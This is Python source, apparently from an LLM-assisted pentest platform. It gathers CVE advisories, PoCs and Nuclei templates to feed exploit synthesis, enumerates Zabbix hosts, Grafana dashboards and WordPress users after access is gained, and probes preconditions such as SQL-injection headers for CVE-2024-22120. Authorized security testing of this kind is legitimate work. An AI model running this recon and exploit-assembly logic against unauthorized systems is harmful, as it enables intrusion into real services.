@app.get("/exploit-store/{exploit_id}/trace", tags=["Exploit Store"])
def get_exploit_trace(exploit_id: str, authorized: bool = Depends(auth)):
    """Return the full verbose trace for this exploit's build/collect run: every research,
    precondition fetch, synthesize prompt/response, run+output, refine, reflection check,
    drift detection, and enumerate step (with errors/tweaks that fired). Reads the JSONL
    file at metadata.log; returns an empty list if the log is missing."""
    import json as _j
    _ensure_exploit_store()
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT poc_log_path, metadata FROM exploit_store WHERE id = %s", (exploit_id,))
        row = cur.fetchone()
    if not row:
        raise HTTPException(404, "exploit not found")
    md = row.get("metadata") or {}
    log_path = row.get("poc_log_path") or md.get("log")
    if not log_path:
        return {"ok": True, "log_path": None, "phases": [], "reason": "no log path on this entry"}
    try:
        entries = []
        with open(log_path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    entries.append(_j.loads(line))
                except Exception:  # noqa: BLE001
                    continue
        return {"ok": True, "log_path": log_path, "count": len(entries), "phases": entries}
    except FileNotFoundError:
        return {"ok": True, "log_path": log_path, "phases": [], "reason": "log file missing"}
    except Exception as e:  # noqa: BLE001
        raise HTTPException(500, f"read trace: {e}")


@app.get("/exploit-store/{exploit_id}/recon-comparison", tags=["Exploit Store"])
def get_exploit_recon_comparison(exploit_id: str, authorized: bool = Depends(auth)):
    """Per-tool recon comparison for this build: wall-clock and characters-added by each
    tool that ran (port_sweep / basic / arjun / zap / zap_active), plus which recon_source
    the operator picked. Read from metadata.metrics.recon_comparison set at build time.
    Answers 'which recon tool was worth the time on this target?' — the benchmark data."""
    _ensure_exploit_store()
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT cve, target_host, target_port, metadata FROM exploit_store WHERE id = %s",
                    (exploit_id,))
        row = cur.fetchone()
    if not row:
        raise HTTPException(404, "exploit not found")
    md = row.get("metadata") or {}
    metrics = md.get("metrics") or {}
    rc = metrics.get("recon_comparison") or {}
    if not rc:
        return {"ok": True, "cve": row["cve"], "target": f"{row['target_host']}:{row['target_port']}",
                "recon_comparison": {}, "reason": "no recon comparison stored (older build)"}
    # Rank tools by chars_added / second (signal-per-second) so the winner is obvious.
    ranked = []
    for tool, m in rc.items():
        secs = float(m.get("seconds") or 0)
        chars = int(m.get("chars_added") or 0)
        rate = round(chars / secs, 1) if secs > 0 else None
        ranked.append({"tool": tool, "seconds": secs, "chars_added": chars,
                       "signal": m.get("signal", ""), "chars_per_sec": rate})
    ranked.sort(key=lambda x: (-(x["chars_per_sec"] or 0), x["seconds"]))
    return {
        "ok": True, "cve": row["cve"],
        "target": f"{row['target_host']}:{row['target_port']}",
        "recon_source": metrics.get("recon_source"),
        "recon_seconds_total": metrics.get("recon_seconds_total"),
        "ranked": ranked,
        "recon_comparison": rc,
    }


@app.post("/exploit-store/{exploit_id}/restore/{version}", tags=["Exploit Store"])
def restore_exploit_version(exploit_id: str, version: int, authorized: bool = Depends(auth)):
    """Restore a stored version into the main entry. The current state is snapshotted
    first (so a restore is itself reversible)."""
    _ensure_exploit_store()
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
        cur_row = cur.fetchone()
        if not cur_row:
            raise HTTPException(404, "exploit not found")
        cur.execute("SELECT * FROM exploit_store_versions WHERE exploit_id = %s AND version = %s",
                    (exploit_id, version))
        v = cur.fetchone()
        if not v:
            raise HTTPException(404, "version not found")
        _snapshot_exploit_version(cur, dict(cur_row), label=f"auto (pre-restore of v{version})")
        cur.execute("""UPDATE exploit_store SET name=%s, command=%s, assertion=%s, python_code=%s,
                       http_request=%s, rationale=%s, verified=%s, llm_model=%s, updated_at=now()
                       WHERE id=%s RETURNING *""",
                    (v["name"], v["command"], Json(v["assertion"] or {}), v["python_code"],
                     v["http_request"], v["rationale"], v["verified"], v["llm_model"], exploit_id))
        row = cur.fetchone(); conn.commit()
    try:
        emit_webhook("exploit_store_version_restored", "exploit_store",
                     {"id": exploit_id, "restored_version": version})
    except Exception:  # noqa: BLE001
        pass
    return dict(row)


def _fetch_jira_ticket_text(url, timeout=8, max_bytes=12000):
    """Vendor bug-trackers (Zabbix, Apache, Jenkins, Atlassian, many others)
    run Atlassian Jira. The /browse/<KEY> page is a JS shell useless to a
    plain fetch, but the REST API /rest/api/2/issue/<KEY> returns structured
    JSON with the full description + comments — which for a security ticket
    routinely contains the ENTIRE PoC + reproduction steps (ZBX-24505 for
    CVE-2024-22120 literally ships the exploit recipe).

    Returns a compact text block, or "" when the URL isn't a Jira browse URL
    or the API doesn't answer.
    """
    import httpx as _hx, re as _re
    m = _re.match(r"(https?://[^/]+)/browse/([A-Z][A-Z0-9]+-\d+)", url or "")
    if not m:
        return ""
    base, key = m.group(1), m.group(2)
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
                         headers={"User-Agent": "Mozilla/5.0 (compatible; PentestBot/1)",
                                  "Accept": "application/json"}) as cli:
            r = cli.get(f"{base}/rest/api/2/issue/{key}"
                        "?fields=summary,description,comment")
        if r.status_code >= 400:
            return ""
        j = r.json() or {}
        f = j.get("fields") or {}
        bits = [f"JIRA {key}: {f.get('summary','')}"]
        if f.get("description"):
            bits.append(str(f["description"])[:max_bytes])
        # Comments often carry the operator's clarified repro / the patch note
        cmts = ((f.get("comment") or {}).get("comments")) or []
        for c in cmts[:3]:
            body = (c.get("body") or "")[:1500]
            if body:
                bits.append(f"[comment] {body}")
        return "\n".join(bits)[:max_bytes + 4000]
    except Exception:  # noqa: BLE001
        return ""


def _fetch_advisory_text(url, timeout=6, max_bytes=40000):
    """Fetch a URL body and reduce it to plain text (strip scripts/styles, collapse HTML
    tags). Size-capped, timeout-capped, failure-quiet — this feeds LLM context, so a
    dead or huge URL should never break the pipeline. Jira /browse/ URLs are
    routed to the REST API (the HTML page is a useless JS shell)."""
    import httpx as _hx, re as _re
    # Vendor bug-tracker tickets: fetch via REST (the browse page is JS-only).
    if "/browse/" in (url or ""):
        jira = _fetch_jira_ticket_text(url, timeout=max(timeout, 8), max_bytes=min(max_bytes, 12000))
        if jira:
            return jira
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
                         headers={"User-Agent": "Mozilla/5.0 (compatible; PentestBot/1)"}) as cli:
            r = cli.get(url)
        if r.status_code >= 400:
            return ""
        ct = (r.headers.get("content-type") or "").lower()
        body = r.text[:max_bytes]
        if "html" in ct:
            body = _re.sub(r"<script[^>]*>.*?</script>", "", body, flags=_re.S | _re.I)
            body = _re.sub(r"<style[^>]*>.*?</style>", "", body, flags=_re.S | _re.I)
            body = _re.sub(r"<[^>]+>", " ", body)
            body = _re.sub(r"\s+", " ", body).strip()
        return body[:max_bytes]
    except Exception:  # noqa: BLE001
        return ""


def _fetch_cve_advisories_from_apis(cve, timeout=8):
    """Pull CVE-specific advisory content from JSON APIs that don't need scraping.
    GitHub Advisories API + CIRCL CVE Search return structured data — no client-side
    JS shells, no rate-limit surprises like DDG. This is the primary path; DDG scrape
    is the fallback when APIs miss.
    Returns a compact text block with each source's advisory content."""
    import httpx as _hx, json as _j
    if not cve:
        return ""
    chunks = []
    # 1. GitHub Advisories API — best source for vector-level detail
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
            r = cli.get(f"https://api.github.com/advisories?cve_id={cve}",
                         headers={"Accept": "application/vnd.github+json"})
        if r.status_code == 200:
            for adv in (r.json() or [])[:2]:
                bits = [f"GHSA: {adv.get('ghsa_id')}",
                        f"Summary: {adv.get('summary', '')[:300]}",
                        f"Severity: {adv.get('severity', '')}"]
                if adv.get("description"):
                    bits.append(f"Description: {adv['description'][:2500]}")
                refs = adv.get("references") or []
                # GitHub Advisories API returns references as a list of plain
                # URL STRINGS (not {url: ...} objects). Tolerate both shapes —
                # the previous x.get("url") raised AttributeError on strings
                # and the bare except swallowed the ENTIRE GitHub branch, so
                # the richest advisory source produced nothing.
                def _ref_url(x):
                    return x if isinstance(x, str) else (x.get("url") or "" if isinstance(x, dict) else "")
                ref_urls = [u for u in (_ref_url(x) for x in refs) if u]
                if ref_urls:
                    bits.append("References: " + ", ".join(ref_urls[:6]))
                chunks.append("--- GITHUB ADVISORY ---\n" + "\n".join(bits))
                # Fetch each referenced repo/issue/PR/commit (often the exact
                # PoC or the patch diff). Prioritize commit/pull URLs — the
                # diff names the vulnerable sink.
                # Prioritize patch commits/PRs AND vendor bug-tracker tickets
                # (/browse/<KEY> Jira) — the latter often carry the full PoC.
                _patchy = [u for u in ref_urls
                           if any(s in u for s in ("/commit/", "/pull/", "/compare/", "/browse/"))]
                _other = [u for u in ref_urls if u not in _patchy]
                for url in (_patchy + _other)[:5]:
                    # github/gitee repos + any Jira browse URL get fetched;
                    # Jira routes to the REST API inside _fetch_advisory_text.
                    if any(h in url for h in ("github.com/", "gitee.com/")) or "/browse/" in url:
                        body = _fetch_advisory_text(url, timeout=8, max_bytes=12000)
                        if body:
                            chunks.append(f"--- REF ({url}) ---\n{body[:8000]}")
    except Exception:  # noqa: BLE001
        pass
    # 2. CIRCL CVE Search — mirrors NVD + references as JSON
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
            r = cli.get(f"https://cve.circl.lu/api/cve/{cve}")
        if r.status_code == 200:
            j = r.json() or {}
            bits = []
            if j.get("summary"): bits.append(f"Summary: {j['summary'][:2000]}")
            if j.get("cvss"): bits.append(f"CVSS: {j['cvss']}")
            if j.get("references"):
                bits.append("References: " + ", ".join(j["references"][:8]))
            if bits:
                chunks.append("--- CIRCL/NVD ---\n" + "\n".join(bits))
    except Exception:  # noqa: BLE001
        pass
    # 3. Nuclei templates — the goldmine when it exists. Direct raw content.
    for nuclei_url in (
        f"https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/{cve[4:8]}/{cve}.yaml",
        f"https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/http/cves/{cve[4:8]}/{cve}.yaml",
    ):
        try:
            with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
                r = cli.get(nuclei_url)
            if r.status_code == 200 and len(r.text) > 100:
                chunks.append(f"--- NUCLEI TEMPLATE ({nuclei_url}) ---\n{r.text[:4000]}")
                break
        except Exception:  # noqa: BLE001
            continue
    if not chunks:
        return ""
    return ("PUBLIC ADVISORIES for " + cve + " (from GitHub Advisories API + CIRCL + "
            "Nuclei templates — these usually name the exact vulnerable endpoint/param):\n"
            + "\n".join(chunks))


def _research_cve_advisories(cve, max_results=3, per_url_bytes=6000,
                              product=None, version=None):
    """Advisory + patch/changelog retrieval for a CVE. The GHSA advisory and
    the PATCH COMMIT that fixed the issue usually name the exact vulnerable
    endpoint/param — the highest-value vector detail. Order:
      1. GitHub Advisories API + CIRCL + Nuclei template (structured, no
         rate-limit surprises) — these link the patch commit.
      2. DDG scrape for advisory + PATCH + CHANGELOG records (fallback /
         supplement), including product-specific changelog queries.
    Returns a compact text block; empty on total failure."""
    if not cve:
        return ""
    # Structured APIs first — they carry the GHSA body + patch-commit links.
    api_text = _fetch_cve_advisories_from_apis(cve)
    # Fire several queries and merge — advisory, PoC, PATCH COMMIT, and (when
    # we know the product) the vendor CHANGELOG / release notes for the fixed
    # version. The changelog entry for a CVE often states the exact component
    # fixed ("fixed SQL injection in the clientip field of scripts").
    queries = [f"{cve} poc github", f"{cve} advisory patch commit",
               f"{cve} fix changelog"]
    if product:
        pv = f"{product} {version}" if version else product
        queries.append(f"{pv} changelog {cve}")
        queries.append(f"{pv} security release notes {cve}")
    all_results = []
    for query in queries:
        try:
            all_results.extend(ddg_search(query, max_results=8, timeout=8) or [])
        except Exception:  # noqa: BLE001
            pass
    # Filter to real advisory-shaped URLs; skip DDG click-tracking, PDFs, ads.
    seen_urls = set()
    good = []
    for r in all_results:
        url = (r.get("url") or "").strip()
        if not url or url in seen_urls:
            continue
        seen_urls.add(url)
        if url.endswith(".pdf") or "duckduckgo.com/y.js" in url or "bing.com/aclick" in url:
            continue
        # Prioritize by likely value: nuclei templates (best — literal request template),
        # GitHub advisories / repos / gists, Gitee, NVD, PoC aggregators, vendor changelogs.
        weight = 0
        if "nuclei-templates" in url or ".yaml" in url or ".yml" in url: weight += 5
        if "github.com/advisories/" in url or "github.com/" in url and cve.lower() in url.lower(): weight += 4
        if "github.com" in url or "gitee.com" in url: weight += 3
        if "nvd.nist.gov" in url or "cve.mitre.org" in url: weight += 2
        if "poc_detail" in url.lower() or "advisory" in url.lower() or "cvefeed" in url: weight += 2
        if weight > 0:
            r["_weight"] = weight
            good.append(r)
    good.sort(key=lambda x: -x.get("_weight", 0))
    good = good[:max_results]
    # Fallback: DDG occasionally returns empty (rate-limit, page-shape change). Hit a
    # handful of well-known CVE aggregators directly so we always have SOMETHING.
    if not good:
        for direct_url, title in (
            (f"https://nvd.nist.gov/vuln/detail/{cve}",
             f"NVD detail for {cve}"),
            (f"https://github.com/advisories?query={cve}",
             f"GitHub Advisories search: {cve}"),
            (f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}",
             f"MITRE CVE record: {cve}"),
        ):
            good.append({"url": direct_url, "title": title, "_weight": 1})
        good = good[:max_results]
    chunks = []
    for r in good[:max_results]:
        url = r["url"]
        title = (r.get("title") or "")[:120]
        body = _fetch_advisory_text(url, max_bytes=per_url_bytes)
        if body:
            chunks.append(f"--- ADVISORY/PATCH: {title}\nURL: {url}\n{body[:per_url_bytes]}\n")
    # Merge the structured-API text (GHSA body + patch-commit links) with the
    # DDG-scraped advisory/patch/changelog chunks — both are valuable; neither
    # should shadow the other.
    merged = []
    if api_text:
        merged.append(api_text)
    if chunks:
        merged.append("PUBLIC ADVISORIES / PATCH NOTES / CHANGELOG for " + cve
                      + " (the advisory + patch commit + vendor changelog often "
                        "name the exact vulnerable endpoint/param + the fix — read "
                        "the DIFF to find what input reaches the sink):\n"
                      + "\n".join(chunks))
    return "\n\n".join(merged)


def _zabbix_api_hostids(ip, port, username, password, timeout=12):
    """Enumerate hostids the user can operate on via the Zabbix JSON-RPC API
    (user.login → host.get). The web session cookie can't list hosts (the UI
    loads them via AJAX), but the documented API does — and CVE-2024-22120's
    script-execution precondition needs a real hostid. Returns [{hostid,name}]."""
    import httpx as _hx
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    out = []
    try:
        with _hx.Client(verify=False, timeout=timeout) as c:
            r = c.post(base + "/api_jsonrpc.php",
                       json={"jsonrpc": "2.0", "method": "user.login",
                             "params": {"username": username, "password": password},
                             "id": 1},
                       headers={"Content-Type": "application/json-rpc"})
            tok = (r.json() or {}).get("result") if r.status_code == 200 else None
            # Older Zabbix used 'user'/'password' param names.
            if not tok:
                r = c.post(base + "/api_jsonrpc.php",
                           json={"jsonrpc": "2.0", "method": "user.login",
                                 "params": {"user": username, "password": password},
                                 "id": 1},
                           headers={"Content-Type": "application/json-rpc"})
                tok = (r.json() or {}).get("result") if r.status_code == 200 else None
            if not tok:
                return []
            h = c.post(base + "/api_jsonrpc.php",
                       json={"jsonrpc": "2.0", "method": "host.get",
                             "params": {"output": ["hostid", "name", "status"]},
                             "auth": tok, "id": 2},
                       headers={"Content-Type": "application/json-rpc"})
            for host in ((h.json() or {}).get("result") or []):
                if host.get("hostid"):
                    out.append({"hostid": host["hostid"], "name": host.get("name", "")})
    except Exception as e:  # noqa: BLE001
        logging.debug("zabbix api host enum failed: %s", e)
    return out


def _enumerate_access_inventory(ip, port, product=None, auth=None,
                                 session_cookie=None, timeout=12):
    """BASIC post-access enumeration: once a session is confirmed, inventory
    WHAT that access gives you — the objects/resources the account can see and
    use (hosts, users, scripts, dashboards, datasources, etc.). This is a
    standard step after gaining access, not a per-exploit afterthought: the
    inventory feeds any exploit's preconditions AND the operator's view of the
    foothold's reach.

    Operator ask: "that should have been a basic step to enumerate available
    info after confirming access."

    App-aware (Zabbix / Grafana / WordPress) with a generic fallback. Returns
    {object_type: [{id, name}]}. Every item is also persisted to
    confirmed_facts as an object_id so it's reusable across attacks.
    """
    import httpx as _hx
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    prod_l = (product or "").lower()
    inv = {}
    u = (auth or {}).get("username"); p = (auth or {}).get("password")
    hdr = {"User-Agent": "Mozilla/5.0"}
    if session_cookie:
        hdr["Cookie"] = session_cookie
    try:
        # ── DATA-DRIVEN: JSON-RPC object enumeration from the product's probe
        #    spec (scales without code — Zabbix objects now come from YAML) ──
        _spec = _probe_spec(product)
        if _spec and _spec.get("transport") == "jsonrpc" and u and p:
            _b = f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}"
            _tok = _spec_jsonrpc_login(_b, _spec, auth, timeout=timeout)
            if _tok:
                inv.update(_spec_enumerate_objects(_b, _spec, _tok, timeout=timeout))
        # ── Grafana: dashboards + datasources ──
        elif "grafana" in prod_l:
            with _hx.Client(verify=False, timeout=timeout, headers=hdr) as c:
                for path, otype, idk, namek in (
                    ("/api/search?type=dash-db", "dashboard_uid", "uid", "title"),
                    ("/api/datasources", "datasource_id", "id", "name")):
                    try:
                        r = c.get(base + path)
                        if r.status_code == 200:
                            vals = [{"id": str(it.get(idk)), "name": it.get(namek, "")}
                                    for it in (r.json() or []) if it.get(idk) is not None]
                            if vals: inv[otype] = vals
                    except Exception:  # noqa: BLE001
                        continue
        # ── WordPress: users + post types (REST) ──
        elif "wordpress" in prod_l:
            with _hx.Client(verify=False, timeout=timeout, headers=hdr) as c:
                try:
                    r = c.get(base + "/wp-json/wp/v2/users?per_page=25")
                    if r.status_code == 200:
                        vals = [{"id": str(it.get("id")), "name": it.get("slug", "")}
                                for it in (r.json() or []) if it.get("id") is not None]
                        if vals: inv["user_id"] = vals
                except Exception:  # noqa: BLE001
                    pass
    except Exception as e:  # noqa: BLE001
        logging.debug("access inventory failed: %s", e)
    # Persist every enumerated object as a reusable confirmed fact.
    tgt = f"{ip}:{port or 80}"
    for otype, items in inv.items():
        for it in items[:25]:
            if it.get("id"):
                _record_confirmation(tgt, "object_id", otype, "confirmed",
                                     evidence=f"enumerated post-access: {otype}="
                                              f"{it['id']} ({it.get('name','')})",
                                     method="enumeration", claim_value=str(it["id"]),
                                     product=product, cve=None)
    return inv


_BUILDING_BLOCKS_CACHE = None


def _load_building_blocks():
    """Load knowledge/exploit_building_blocks.yaml (cached) — the lightweight-
    check catalog the challenge walks to validate exploit pieces."""
    global _BUILDING_BLOCKS_CACHE
    if _BUILDING_BLOCKS_CACHE is not None:
        return _BUILDING_BLOCKS_CACHE
    import yaml as _yaml
    _kd = os.environ.get("KNOWLEDGE_DIR", "/knowledge")
    for p in (os.path.join(_kd, "exploit_building_blocks.yaml"),
              os.path.join(os.path.dirname(__file__), "..", "knowledge", "exploit_building_blocks.yaml"),
              "knowledge/exploit_building_blocks.yaml"):
        try:
            with open(p, encoding="utf-8") as f:
                _BUILDING_BLOCKS_CACHE = (_yaml.safe_load(f) or {}).get("blocks") or []
                return _BUILDING_BLOCKS_CACHE
        except Exception:  # noqa: BLE001
            continue
    _BUILDING_BLOCKS_CACHE = []
    return _BUILDING_BLOCKS_CACHE


def _rag_recall(query, top_k=3, sources=None):
    """Internal semantic recall over rag_documents (same path as the
    /rag/knowledge/search endpoint). Best-effort; returns [{title,text,similarity}]."""
    try:
        vec = _embed_text(query)
    except Exception:  # noqa: BLE001
        return []
    vec_str = "[" + ",".join(repr(float(x)) for x in vec) + "]"
    where = "embedding IS NOT NULL"
    params = [vec_str]
    if sources:
        where += " AND metadata->>'source' = ANY(%s)"
        params.append(list(sources))
    params += [vec_str, max(1, min(int(top_k), 10))]
    try:
        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute("SET LOCAL ivfflat.probes = 100")
            cur.execute(f"SELECT title, text_chunk, 1-(embedding<=>%s::vector) AS sim "
                        f"FROM rag_documents WHERE {where} "
                        f"ORDER BY embedding<=>%s::vector LIMIT %s", params)
            return [{"title": r["title"], "text": r["text_chunk"],
                     "similarity": round(float(r["sim"]), 3)} for r in cur.fetchall()]
    except Exception:  # noqa: BLE001
        return []


def _research_building_block(block_id, product, cve, advisory_text="", analysis=None):
    """Before ASSUMING an unconfirmed building block, DO RESEARCH to resolve it:
    recall the RAG knowledge corpus AND scan the already-gathered advisory/ticket
    text for the specific answer. Operator: "when making an assumption, shouldn't
    it do some research." Returns a short "RESEARCH: ..." hint (or '')."""
    q_map = {
        "injection_vector": f"{cve} {product} SQL injection which parameter or "
                            "header carries the payload X-Forwarded-For clientip audit log",
        "csrf_token": f"{product} anti-CSRF token parameter name sid",
        "action_permitted": f"{product} {cve} privilege required to run the vulnerable action",
        "endpoint_exists": f"{cve} {product} vulnerable endpoint path",
        "version_in_range": f"{cve} {product} affected version range",
        "object_ids": f"{product} {cve} object ids required (host script user)",
    }
    q = q_map.get(block_id, f"{cve or ''} {product or ''} {block_id}".strip())
    hints = []
    adv = advisory_text or ""
    # Concrete extraction from the advisory/ticket for the highest-value block.
    if block_id == "injection_vector" and adv:
        found = [h for h in _IP_INJECTION_HEADERS if h.lower() in adv.lower()]
        if found or "x-forwarded-for" in adv.lower():
            hints.append(f"advisory/ticket names header(s) {', '.join(found) or 'X-Forwarded-For'} "
                         "as the injection carrier — probe/use THAT, not a body param")
    # RAG recall for the block topic.
    for r in _rag_recall(q, top_k=3):
        if r.get("similarity", 0) >= 0.3:
            hints.append(f"{r['title']}: {r['text'][:140]}")
    return ("RESEARCH: " + " | ".join(hints[:3])) if hints else ""


# block id → confirmed_facts claim_type(s) that satisfy it (filled by existing probes)
_BLOCK_FACT_TYPES = {
    "target_reachable": ["target_reachable"],
    "version_in_range": ["version_applies"],
    "session_valid": ["session_valid"],
    "endpoint_exists": ["endpoint_exists"],
    "action_permitted": ["action_permitted"],
    "object_ids": ["object_id"],
    "csrf_token": ["object_id", "token_valid"],
    "injection_vector": ["injection_vector"],
}


def _run_challenge_checks(ip, port, product, analysis, auth=None,
                          session_cookie=None, run_lightweight=True, timeout=12,
                          advisory_text=""):
    """Walk the building-block catalog: for each piece the exploit needs, report
    whether it's already CONFIRMED (from the confirmed_facts ledger), run the
    LIGHTWEIGHT check if it's cheap + missing, and SUGGEST the heavier ones.

    Operator ask: "suggest quick and easy checks to validate specific items to
    help build the exploit in pieces as part of the challenge if they are
    lightweight." Builds the exploit from verified parts. Returns
    {confirmed:[], missing:[], suggestions:[], guidance}."""
    import httpx as _hx
    a = analysis or {}
    blob = (" ".join(str(p) for p in (a.get("preconditions") or []))
            + " " + str(a.get("summary", "")) + " " + str(a.get("vuln_class", ""))).lower()
    # infer vuln class(es)
    classes = set()
    if "sql" in blob or "sleep" in blob or "union select" in blob:
        classes.add("sqli")
    if any(k in blob for k in ("command inj", "os command", "rce", ";id", "|id")):
        classes.add("cmdi")
    if "template inj" in blob or "ssti" in blob:
        classes.add("ssti")
    prod_l = (product or "").lower()
    cve = a.get("cve")
    tgt = f"{ip}:{port or 80}"
    # read confirmed facts for this target/product once
    confirmed_types = set()
    try:
        with get_db() as c, c.cursor() as cur:
            cur.execute("SELECT claim_type FROM public.confirmed_facts "
                        "WHERE target=%s AND status='confirmed' "
                        "AND (product IS NULL OR lower(product)=lower(%s))",
                        (tgt, product or ""))
            confirmed_types = {r[0] for r in cur.fetchall()}
    except Exception:  # noqa: BLE001
        pass

    confirmed, missing, suggestions = [], [], []
    for b in _load_building_blocks():
        bid = b.get("id")
        aw = b.get("applies_when") or {}
        vca = aw.get("vuln_class_any") or []
        pa = [str(x).lower() for x in (aw.get("product_any") or [])]
        if vca and not (classes & set(vca)):
            continue
        if pa and prod_l not in pa and not any(p in prod_l for p in pa):
            continue
        if aw.get("needs_auth") and not (session_cookie or (auth or {}).get("username")):
            continue
        is_conf = any(t in confirmed_types for t in _BLOCK_FACT_TYPES.get(bid, []))
        # lightweight + missing → run the cheap inline check now
        if not is_conf and run_lightweight and (b.get("cost") == "lightweight"):
            try:
                ran = _run_one_building_block(b.get("probe"), ip, port, product,
                                              analysis, auth, session_cookie, timeout)
            except Exception:  # noqa: BLE001
                ran = None
            if ran:
                is_conf = True
        if is_conf:
            confirmed.append({"id": bid, "validates": b.get("validates"),
                              "confirms": b.get("confirms")})
        else:
            # Don't just assume it's missing — RESEARCH the specific item first.
            research = ""
            try:
                research = _research_building_block(bid, product, cve, advisory_text, analysis)
            except Exception:  # noqa: BLE001
                research = ""
            missing.append({"id": bid, "validates": b.get("validates"),
                            "cost": b.get("cost")})
            suggestions.append({"id": bid, "cost": b.get("cost"),
                                "suggest": b.get("suggest"), "research": research})
    bits = []
    if confirmed:
        bits.append("CONFIRMED BUILDING BLOCKS (assemble the exploit from these "
                    "verified pieces):")
        for c in confirmed:
            bits.append(f"  ✓ {c['id']}: {c['validates']}")
    if suggestions:
        bits.append("QUICK CHECKS TO VALIDATE NEXT (build the rest in pieces — "
                    "research first, then probe, don't assume):")
        for sgst in suggestions:
            bits.append(f"  • [{sgst['cost']}] {sgst['id']}: {sgst['suggest']}")
            if sgst.get("research"):
                bits.append(f"      {sgst['research']}")
    return {"confirmed": confirmed, "missing": missing,
            "suggestions": suggestions, "guidance": "\n".join(bits)}


def _run_one_building_block(probe, ip, port, product, analysis, auth,
                            session_cookie, timeout=12):
    """Run ONE lightweight building-block check inline; record a confirmed_fact
    on success. Returns True when the piece is confirmed."""
    import httpx as _hx
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    tgt = f"{ip}:{port or 80}"
    if probe == "reachable":
        try:
            with _hx.Client(verify=False, timeout=timeout) as c:
                r = c.get(base + "/")
            # Richer evidence so the operator sees the actual probe output,
            # not just a verdict. Headers + a body snippet make "reachable"
            # audit-worthy instead of a bare "HTTP 200".
            srv = r.headers.get("Server") or ""
            ct = r.headers.get("Content-Type") or ""
            snippet = (r.text or "").strip().replace("\r", "")[:400]
            ev = f"GET {base}/\nHTTP {r.status_code}  ({len(r.text or '')} bytes)"
            if srv: ev += f"\nServer: {srv}"
            if ct:  ev += f"\nContent-Type: {ct}"
            if snippet: ev += f"\n---\n{snippet}"
            # Headless screenshot of the response — a visual next to the text
            # snippet. Fail-soft: if the browser can't reach the target, the
            # text evidence still lands.
            shot = _capture_fact_screenshot(ip, port, "/")
            if shot:
                ev += f"\nScreenshot: {shot}"
            _record_confirmation(tgt, "target_reachable", "/", "confirmed",
                                 evidence=ev, method="probe", product=product)
            return True
        except Exception:  # noqa: BLE001
            return False
    if probe == "version":
        # DATA-DRIVEN: spec.version (JSON-RPC). Fallback: Server header.
        ver = None
        from_app_spec = False
        _spec = _probe_spec(product)
        if _spec and _spec.get("transport") == "jsonrpc":
            ver = _spec_version(f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}", _spec, timeout)
            if ver:
                from_app_spec = True
        srv_hdr = None
        if not ver:
            try:
                with _hx.Client(verify=False, timeout=timeout) as c:
                    srv_hdr = c.get(base + "/").headers.get("Server")
                    ver = srv_hdr
            except Exception:  # noqa: BLE001
                ver = None
        if ver:
            # A Server header like "Apache/2.4.65 (Debian)" is the HTTP SERVER
            # BANNER, not the application version. Writing it as `version_applies`
            # makes the Confirmed Facts panel show "Apache/2.4.65" where the
            # operator expects "Zabbix 6.0" — misleading when the real app is a
            # web app running behind Apache. Record server-banner-shaped values
            # under a distinct claim_type so the UI (and downstream agents) treat
            # them as what they are: webserver stack info. Operator ask: "the
            # product shows Apache/2.4.65 when it should really be Zabbix."
            import re as _re
            is_server_banner = bool(_re.match(
                r"^(Apache|nginx|gunicorn|uvicorn|cowboy|werkzeug|lighttpd|caddy|IIS|Jetty|Tomcat)/",
                str(ver), _re.I))
            if is_server_banner and not from_app_spec:
                _record_confirmation(tgt, "server_banner",
                                     "Server", "confirmed",
                                     evidence=f"HTTP Server header: {ver}",
                                     method="probe",
                                     claim_value=str(ver), product=product)
                # Don't block readiness — the app version is just unknown yet.
                return False
            _record_confirmation(tgt, "version_applies", str(ver), "confirmed",
                                 evidence=f"detected version {ver}", method="probe",
                                 claim_value=str(ver), product=product)
            return True
        return False
    if probe == "session" and session_cookie:
        try:
            valid, why = _probe_session_valid(ip, port, session_cookie, product=product)
            if valid:
                # Screenshot of the authenticated page (unauth preview — the
                # /preview endpoint doesn't accept arbitrary cookies, so this
                # shows what the operator SEES at that URL as an anon user; the
                # auth-cookie text evidence is the proof of authenticated
                # access). Append the path so UI can embed.
                shot = _capture_fact_screenshot(ip, port, "/")
                if shot:
                    why = (why or "") + f"\nScreenshot: {shot}"
                _record_confirmation(tgt, "session_valid", "auth", "confirmed",
                                     evidence=why, method="probe", product=product)
            return valid
        except Exception:  # noqa: BLE001
            return False
    if probe == "endpoint":
        # ENHANCEMENT 4: endpoint existence + DISCOVERY. Try the advisory endpoint;
        # if it's missing/404, probe a bounded candidate set (the product's probe/
        # action endpoints from the contract + a few common app paths) and record
        # the first that responds — so an all_404 target gets a real endpoint to
        # aim at instead of looping on a guessed path.
        cands = []
        tep = ((analysis or {}).get("target_endpoint") or "").strip()
        if tep.startswith("/"):
            cands.append(tep)
        _spec = _probe_spec(product)
        if _spec and _spec.get("endpoint"):
            cands.append(_spec["endpoint"])
        _contract = _app_request_contract(product)
        if _contract and _contract.get("action_endpoint"):
            cands.append(_contract["action_endpoint"])
        try:
            cands += [p for p in (load_common_web_paths() or [])][:15]
        except Exception:  # noqa: BLE001
            pass
        seen = set()
        hdrs = {"Cookie": session_cookie} if session_cookie else {}
        try:
            with _hx.Client(verify=False, timeout=timeout, follow_redirects=True,
